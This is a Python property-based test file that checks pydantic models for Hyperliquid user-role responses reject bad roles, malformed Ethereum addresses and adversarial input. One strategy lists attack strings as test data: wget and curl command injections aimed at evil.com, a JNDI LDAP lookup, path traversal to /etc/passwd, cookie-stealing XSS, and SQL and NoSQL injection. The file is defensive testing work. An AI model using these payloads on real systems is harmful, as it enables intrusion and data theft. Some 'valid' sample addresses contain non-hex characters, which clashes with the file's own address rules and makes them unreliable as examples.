"""Property-based tests for Hyperliquid raw user role models.

These tests validate critical security boundary models that process external user role data.
The models tested here are essential for user authentication, authorization, and access control.

SECURITY CRITICAL: These raw models protect against:
- Malicious user role data that could manipulate access permissions
- Privilege escalation attacks through invalid role assignments
- Buffer overflow attacks through oversized role structures
- Injection attacks through malformed role data
- Type confusion that could bypass role validation
- Address spoofing in agent and subaccount roles
- Authorization bypass through role manipulation

Property testing ensures comprehensive coverage of user role edge cases and adversarial inputs.
"""

import string
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_user_role import (
    HyperliquidRawUserRoleData,
    HyperliquidRawUserRoleResponse,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# Type alias for malicious input types to avoid long lines
MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None


# =============================================================================
# HYPOTHESIS STRATEGIES FOR USER ROLE MODEL TESTING
# =============================================================================


def _build_hex_address(hex_part: str) -> str:
    """Build hex address with 0x prefix."""
    return f"0x{hex_part}"


def _build_address_with_prefix(prefix: str, hex_part: str) -> str:
    """Build address with custom prefix."""
    return f"{prefix}{hex_part}"


def valid_ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum addresses for user role data.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Known valid addresses
        st.sampled_from([
            "0xagentuseraddress1234567890abcdef123456",
            "0xmasteraddress1234567890abcdef12345678",
            "0x1234567890123456789012345678901234567890",
            "0x0987654321098765432109876543210987654321",
            "0x742d35cc6aB26c94C2cF04E1b1F4c2eD2bF4D1C3",
            "0x0000000000000000000000000000000000000000",  # Zero address
        ]),
        # Generated valid addresses
        st.builds(
            _build_hex_address,
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
    ])


def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate invalid Ethereum address strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Wrong length
        st.text(min_size=1, max_size=39, alphabet=string.hexdigits),
        st.text(min_size=41, max_size=100, alphabet=string.hexdigits),
        # Missing 0x prefix
        st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        # Wrong prefix
        st.builds(
            _build_address_with_prefix,
            st.sampled_from(["0X", "1x", "x", "00x", ""]),
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
        # Invalid characters
        st.builds(
            _build_hex_address,
            st.text(
                min_size=40,
                max_size=40,
                alphabet="ghijklmnopqrstuvwxyzGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()",
            ),
        ),
        # Common invalid formats
        st.just("not-an-address"),
        st.just("0xshort"),
        st.just("longaddress" * 10),
        st.just(""),
    ])


def valid_role_strategy() -> SearchStrategy[str]:
    """Generate valid user role types.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.sampled_from([
        "user",
        "agent",
        "vault",
        "subAccount",
        "missing",
    ])


def invalid_role_strategy() -> SearchStrategy[str]:
    """Generate invalid user role types.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.just("unknownRole"),
        st.just("admin"),
        st.just("root"),
        st.just("USER"),  # Wrong case
        st.just("AGENT"),  # Wrong case
        st.just(""),
        st.just("   "),
        st.text(min_size=1, max_size=50).filter(
            lambda x: x not in ["user", "agent", "vault", "subAccount", "missing"]
        ),
    ])


@st.composite
def valid_role_data_strategy(draw: st.DrawFn) -> dict[str, str | None]:
    """Generate valid role data dictionaries.

    Returns:
        dict[str, str | None]: Generated test data.
    """
    role_type = draw(st.sampled_from(["agent", "subAccount", "empty"]))

    if role_type == "agent":
        return {"user": draw(valid_ethereum_address_strategy())}
    if role_type == "subAccount":
        return {"master": draw(valid_ethereum_address_strategy())}
    if role_type == "empty":
        return {}
    # Mixed or None values
    result: dict[str, str | None] = draw(
        st.one_of([
            st.just({"user": None, "master": None}),
            st.dictionaries(
                st.sampled_from(["user", "master"]),
                st.one_of([valid_ethereum_address_strategy(), st.none()]),
                min_size=0,
                max_size=2,
            ),
        ])
    )
    return result


@st.composite
def valid_user_role_response_strategy(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid user role response data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    role = draw(valid_role_strategy())

    # Decide whether to include data
    include_data = draw(st.booleans())

    response: dict[str, Any] = {"role": role}

    if include_data:
        # Some roles require specific data
        if role == "agent":
            response["data"] = {"user": draw(valid_ethereum_address_strategy())}
        elif role == "subAccount":
            response["data"] = {"master": draw(valid_ethereum_address_strategy())}
        else:
            # For other roles, data can be None or empty
            response["data"] = draw(
                st.one_of([
                    st.none(),
                    valid_role_data_strategy(),
                ])
            )

    return response


def malicious_user_role_strategy() -> SearchStrategy[MaliciousInput]:
    """Generate malicious values for user role security testing.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # User role manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-roles}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('role-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE user_roles;--"),
        st.just("1' UNION SELECT * FROM permissions--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("R" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.roles.find(); //"),
        # JSON injection
        st.just('{"$where": "this.role === \'admin\'"}'),
        # Role manipulation
        st.just("user'; UPDATE roles SET role='admin';--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.binary(),
        # Privilege escalation attempts
        st.just("admin"),
        st.just("superuser"),
        st.just("root"),
        st.just("system"),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW USER ROLE DATA MODEL
# =============================================================================


class TestHyperliquidRawUserRoleDataProperties:
    """Property-based tests for HyperliquidRawUserRoleData validation and security."""

    @given(role_data=valid_role_data_strategy())
    def test_role_data_validation_success_properties(
        self, role_data: dict[str, str | None]
    ) -> None:
        """Property: Valid role data should create valid HyperliquidRawUserRoleData."""
        # Skip invalid data
        try:
            for value in role_data.values():
                if value is not None:
                    assume(value)  # Assume non-empty
                    assume(len(value) == 42)  # Valid Ethereum address length
                    assume(value.startswith("0x"))
                    assume(all(c in string.hexdigits for c in value[2:]))
        except (TypeError, IndexError):
            assume(False)

        obj = HyperliquidRawUserRoleData.model_validate(role_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawUserRoleData)

        # Property: All fields should be preserved with correct types
        if "user" in role_data:
            assert obj.user == role_data["user"]
        if "master" in role_data:
            assert obj.master == role_data["master"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["user", "master"]),
        malicious_value=malicious_user_role_strategy(),
    )
    def test_role_data_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Role data model should reject malicious inputs."""
        role_data = {field_name: malicious_value}

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawUserRoleData.model_validate(role_data)

    @given(
        field_name=st.sampled_from(["user", "master"]),
        invalid_address=invalid_ethereum_address_strategy(),
    )
    def test_role_data_invalid_address_properties(
        self, field_name: str, invalid_address: str
    ) -> None:
        """Property: Role data should reject invalid Ethereum addresses."""
        role_data = {field_name: invalid_address}

        # Property: Invalid addresses should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawUserRoleData.model_validate(role_data)

    @given(
        valid_address=valid_ethereum_address_strategy(),
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20).filter(lambda x: x not in ["user", "master"]),
            st.one_of([st.text(), st.integers(), st.booleans()]),
            min_size=1,
            max_size=5,
        ),
    )
    def test_role_data_extra_fields_properties(
        self, valid_address: str, extra_fields: dict[str, Any]
    ) -> None:
        """Property: Role data should forbid extra fields."""
        # Skip invalid addresses
        try:
            assume(len(valid_address) == 42 and valid_address.startswith("0x"))
        except (TypeError, IndexError):
            assume(False)

        role_data = {"user": valid_address}
        role_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError) as exc_info:
            HyperliquidRawUserRoleData.model_validate(role_data)

        # Property: Error should mention extra fields
        assert "extra" in str(exc_info.value).lower()

    @given(role_data=valid_role_data_strategy())
    def test_role_data_immutability_properties(self, role_data: dict[str, str | None]) -> None:
        """Property: Role data should be immutable after creation."""
        # Skip invalid data
        try:
            for value in role_data.values():
                if value is not None:
                    assume(len(value) == 42)
                    assume(value.startswith("0x"))
        except (TypeError, IndexError):
            assume(False)

        obj = HyperliquidRawUserRoleData.model_validate(role_data)

        # Property: Attempting to modify fields should fail (frozen=True)
        if hasattr(obj, "user"):
            with pytest.raises((AttributeError, ValidationError)):
                obj.user = "0xmodified000000000000000000000000000000"

        if hasattr(obj, "master"):
            with pytest.raises((AttributeError, ValidationError)):
                obj.master = "0xmodified000000000000000000000000000000"


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW USER ROLE RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawUserRoleResponseProperties:
    """Property-based tests for HyperliquidRawUserRoleResponse validation and security."""

    @given(response_data=valid_user_role_response_strategy())
    def test_user_role_response_validation_success_properties(
        self, response_data: dict[str, Any]
    ) -> None:
        """Property: Valid data should create valid objects."""
        # Skip invalid data
        try:
            assume(isinstance(response_data["role"], str))
            assume(response_data["role"] in ["user", "agent", "vault", "subAccount", "missing"])

            if "data" in response_data and response_data["data"] is not None:
                data = response_data["data"]
                assume(isinstance(data, dict))
                for value in data.values():
                    if value is not None:
                        assume(isinstance(value, str) and len(value) == 42)
                        assume(value.startswith("0x"))
        except (TypeError, KeyError, IndexError):
            assume(False)

        obj = HyperliquidRawUserRoleResponse.model_validate(response_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawUserRoleResponse)

        # Property: Role should be preserved
        assert obj.role == response_data["role"]

        # Property: Data should be handled correctly
        if "data" in response_data and response_data["data"] is not None:
            assert obj.data is not None
            assert isinstance(obj.data, HyperliquidRawUserRoleData)
        else:
            assert obj.data is None

    @given(
        field_name=st.sampled_from(["role", "data"]),
        malicious_value=malicious_user_role_strategy(),
    )
    def test_user_role_response_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: User role response should reject malicious inputs."""
        base_data: dict[str, object] = {"role": "user"}
        if field_name == "data":
            base_data["data"] = malicious_value
        else:
            base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawUserRoleResponse.model_validate(base_data)

    @given(invalid_role=invalid_role_strategy())
    def test_user_role_response_invalid_role_properties(self, invalid_role: str) -> None:
        """Property: User role response should reject invalid role types."""
        response_data = {"role": invalid_role}

        # Property: Invalid roles should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawUserRoleResponse.model_validate(response_data)

    @given(
        valid_role=valid_role_strategy(),
        invalid_data_type=st.one_of([
            st.integers(),
            st.floats(),
            st.booleans(),
            st.text(),
            st.lists(st.dictionaries(st.text(), st.text())),
        ]),
    )
    def test_user_role_response_invalid_data_type_properties(
        self, valid_role: str, invalid_data_type: MaliciousInput
    ) -> None:
        """Property: User role response should reject invalid data types."""
        response_data = {"role": valid_role, "data": invalid_data_type}

        # Property: Invalid data types should be rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawUserRoleResponse.model_validate(response_data)

    @given(
        valid_role=valid_role_strategy(),
        invalid_address_data=st.dictionaries(
            st.sampled_from(["user", "master"]),
            invalid_ethereum_address_strategy(),
            min_size=1,
            max_size=2,
        ),
    )
    def test_user_role_response_invalid_nested_address_properties(
        self, valid_role: str, invalid_address_data: dict[str, str]
    ) -> None:
        """Property: User role response should reject invalid nested addresses."""
        response_data = {"role": valid_role, "data": invalid_address_data}

        # Property: Invalid nested addresses should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawUserRoleResponse.model_validate(response_data)

    def test_user_role_response_missing_required_field_properties(self) -> None:
        """Property: User role response should require role field."""
        # Property: Missing required role field should be rejected
        with pytest.raises(ValidationError) as exc_info:
            HyperliquidRawUserRoleResponse.model_validate({})

        # Property: Error should mention field requirement
        assert "required" in str(exc_info.value).lower()

    @given(
        valid_role=valid_role_strategy(),
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20).filter(lambda x: x not in ["role", "data"]),
            st.one_of([st.text(), st.integers(), st.booleans()]),
            min_size=1,
            max_size=5,
        ),
    )
    def test_user_role_response_extra_fields_properties(
        self, valid_role: str, extra_fields: dict[str, Any]
    ) -> None:
        """Property: User role response should forbid extra fields."""
        response_data = {"role": valid_role}
        response_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawUserRoleResponse.model_validate(response_data)

    @given(response_data=valid_user_role_response_strategy())
    def test_user_role_response_none_data_handling_properties(
        self, response_data: dict[str, Any]
    ) -> None:
        """Property: User role response should handle None data correctly."""
        # Skip invalid data
        try:
            assume(response_data["role"] in ["user", "agent", "vault", "subAccount", "missing"])
        except (TypeError, KeyError):
            assume(False)

        # Test with explicit None data
        response_with_none = response_data.copy()
        response_with_none["data"] = None

        obj = HyperliquidRawUserRoleResponse.model_validate(response_with_none)
        assert obj.data is None

        # Test without data field
        response_without_data = {"role": response_data["role"]}
        obj = HyperliquidRawUserRoleResponse.model_validate(response_without_data)
        assert obj.data is None


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawUserRoleIntegrationProperties:
    """Integration property tests for user role models working together."""

    @given(
        responses=st.lists(
            valid_user_role_response_strategy(),
            min_size=2,
            max_size=5,
        ),
        malicious_value=malicious_user_role_strategy(),
    )
    def test_user_role_batch_processing_properties(
        self, responses: list[dict[str, Any]], malicious_value: MaliciousInput
    ) -> None:
        """Property: Multiple user role responses should be processed independently."""
        valid_responses: list[HyperliquidRawUserRoleResponse] = []

        for response_data in responses:
            # Skip invalid responses
            try:
                if response_data["role"] not in ["user", "agent", "vault", "subAccount", "missing"]:
                    continue

                response = HyperliquidRawUserRoleResponse.model_validate(response_data)
                valid_responses.append(response)
            except (ValidationError, TypeError, KeyError):
                continue

        # Property: Each response should maintain its individual values
        for i, response in enumerate(valid_responses):
            assert isinstance(response.role, str)

            # Property: Responses should not affect each other
            for j, other_response in enumerate(valid_responses):
                if i != j:
                    # Each response is independent
                    assert isinstance(other_response.role, str)

        # Property: Malicious value should be rejected when injected
        if valid_responses:
            corrupted_data = {"role": malicious_value}
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                HyperliquidRawUserRoleResponse.model_validate(corrupted_data)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from(["role", "data"]),
            malicious_user_role_strategy(),
            min_size=1,
            max_size=2,
        )
    )
    def test_user_role_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: User role models should handle adversarial input safely."""
        # Property: Complete adversarial input should be safely rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawUserRoleResponse.model_validate(complete_malicious_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_role_data_valid_agent() -> None:
    """Test role data valid agent."""
    valid_role_data_agent = {"user": "0xagentuseraddress1234567890abcdef123456"}
    data = HyperliquidRawUserRoleData.model_validate(valid_role_data_agent)
    assert data.user == valid_role_data_agent["user"]


def test_role_data_valid_subaccount() -> None:
    """Test role data valid subaccount."""
    valid_role_data_subaccount = {"master": "0xmasteraddress1234567890abcdef12345678"}
    data = HyperliquidRawUserRoleData.model_validate(valid_role_data_subaccount)
    assert data.master == valid_role_data_subaccount["master"]


def test_role_data_valid_empty() -> None:
    """Test role data valid empty."""
    data = HyperliquidRawUserRoleData.model_validate({})
    assert data.user is None
    assert data.master is None


def test_role_data_valid_none_values() -> None:
    """Test role data valid with None values."""
    data = HyperliquidRawUserRoleData.model_validate({"user": None, "master": None})
    assert data.user is None
    assert data.master is None


def test_role_data_invalid_address() -> None:
    """Test role data invalid address."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserRoleData.model_validate({"user": "not-an-address"})


def test_role_data_invalid_short_address() -> None:
    """Test role data invalid short address."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserRoleData.model_validate({"user": "0xshort"})


def test_role_data_invalid_type() -> None:
    """Test role data invalid type."""
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawUserRoleData.model_validate({"master": 123})


def test_role_data_forbids_extra_fields() -> None:
    """Test role data forbids extra fields."""
    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawUserRoleData.model_validate({
            "user": "0xagentuseraddress1234567890abcdef123456",
            "extra": "not_allowed",
        })
    assert "Extra inputs are not permitted" in str(exc_info.value)


def test_user_role_response_valid_user() -> None:
    """Test user role response valid user."""
    valid_user_role_user = {"role": "user"}
    response = HyperliquidRawUserRoleResponse.model_validate(valid_user_role_user)
    assert response.role == "user"
    assert response.data is None


def test_user_role_response_valid_agent() -> None:
    """Test user role response valid agent."""
    valid_user_role_agent = {
        "role": "agent",
        "data": {"user": "0xagentuseraddress1234567890abcdef123456"},
    }
    response = HyperliquidRawUserRoleResponse.model_validate(valid_user_role_agent)
    assert response.role == "agent"
    assert response.data is not None
    assert response.data.user == "0xagentuseraddress1234567890abcdef123456"


def test_user_role_response_valid_vault() -> None:
    """Test user role response valid vault."""
    valid_user_role_vault = {"role": "vault"}
    response = HyperliquidRawUserRoleResponse.model_validate(valid_user_role_vault)
    assert response.role == "vault"
    assert response.data is None


def test_user_role_response_valid_subaccount() -> None:
    """Test user role response valid subaccount."""
    valid_user_role_subaccount = {
        "role": "subAccount",
        "data": {"master": "0xmasteraddress1234567890abcdef12345678"},
    }
    response = HyperliquidRawUserRoleResponse.model_validate(valid_user_role_subaccount)
    assert response.role == "subAccount"
    assert response.data is not None
    assert response.data.master == "0xmasteraddress1234567890abcdef12345678"


def test_user_role_response_valid_missing() -> None:
    """Test user role response valid missing."""
    valid_user_role_missing = {"role": "missing"}
    response = HyperliquidRawUserRoleResponse.model_validate(valid_user_role_missing)
    assert response.role == "missing"
    assert response.data is None


def test_user_role_response_missing_role() -> None:
    """Test user role response missing role."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserRoleResponse.model_validate({})


def test_user_role_response_invalid_role() -> None:
    """Test user role response invalid role."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserRoleResponse.model_validate({"role": "unknownRole"})


def test_user_role_response_invalid_nested_address() -> None:
    """Test user role response invalid nested address."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserRoleResponse.model_validate({
            "role": "agent",
            "data": {"user": "invalid-address-format"},
        })


def test_user_role_response_invalid_data_type() -> None:
    """Test user role response invalid data type."""
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawUserRoleResponse.model_validate({"role": "agent", "data": "not-a-dict"})


def test_user_role_response_extra_field() -> None:
    """Test user role response extra field."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserRoleResponse.model_validate({"role": "user", "extraField": "value"})


def test_user_role_response_none_data() -> None:
    """Test user role response with None data."""
    response = HyperliquidRawUserRoleResponse.model_validate({
        "role": "user",
        "data": None,
    })
    assert response.data is None


def test_user_role_response_without_data_field() -> None:
    """Test user role response without data field."""
    response = HyperliquidRawUserRoleResponse.model_validate({"role": "vault"})
    assert response.data is None
